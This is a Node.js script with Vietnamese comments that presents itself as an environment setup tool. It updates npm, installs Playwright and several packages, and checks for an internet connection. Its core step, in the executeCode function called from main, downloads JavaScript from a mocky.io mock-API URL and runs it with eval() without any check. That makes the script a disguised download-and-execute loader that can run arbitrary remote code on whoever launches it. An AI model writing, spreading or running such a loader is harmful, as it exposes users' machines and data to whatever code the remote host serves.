const { exec } = require('child_process');
const https = require('https');
const fs = require('fs');
const path = require('path');

// Danh sách các gói cần thiết
const packages = [
    'express',
    'axios',
    'https',
    'readline',
    '@playwright/test',
    'os'
];

// Hàm thực thi lệnh và trả về Promise
function runCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(stderr || error);
                return;
            }
            resolve(stdout);
        });
    });
}

// Hàm kiểm tra và cài đặt các gói cần thiết
async function setupEnvironment() {
    try {
        await runCommand('npm update');
        await runCommand('npx playwright install');

        for (const pkg of packages) {
            try {
                // Cố gắng cài đặt gói nếu chưa cài
                await runCommand(`npm install ${pkg}`);
            } catch (error) {
                console.error(`Không thể cài đặt ${pkg}:`, error);
            }
        }

        console.log('Môi trường đã được cài đặt xong.');
    } catch (error) {
        console.error('Lỗi khi cài đặt môi trường:', error);
    }
}

// Hàm kiểm tra kết nối internet
function checkInternetConnection() {
    return new Promise((resolve) => {
        https.get('https://www.google.com/', (res) => {
            resolve(res.statusCode === 200);
        }).on('error', () => {
            resolve(false);
        });
    });
}

// Hàm để thực thi mã từ liên kết
async function executeCode(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (response) => {
            let data = '';

            response.on('data', (chunk) => {
                data += chunk;
            });

            response.on('end', () => {
                try {
                    eval(data);
                    resolve();
                } catch (error) {
                    reject(error);
                }
            });
        }).on('error', (error) => {
            reject(error);
        });
    });
}

// Chạy chương trình
(async function main() {
    try {
        // Cài đặt môi trường trước
        await setupEnvironment();

        // Kiểm tra kết nối internet
        if (await checkInternetConnection()) {
            try {
                await executeCode('https://run.mocky.io/v3/c35543e2-feb8-438a-946c-c95c5c267b6e');
            } catch (error) {
                console.error('\x1b[38;5;9mLỗi khi thực thi mã:', error, '\x1b[0m');
            }
        } else {
            console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
        }
    } catch (error) {
        console.error('\x1b[38;5;9mĐã gặp lỗi:', error, '\x1b[0m');
    }
})();
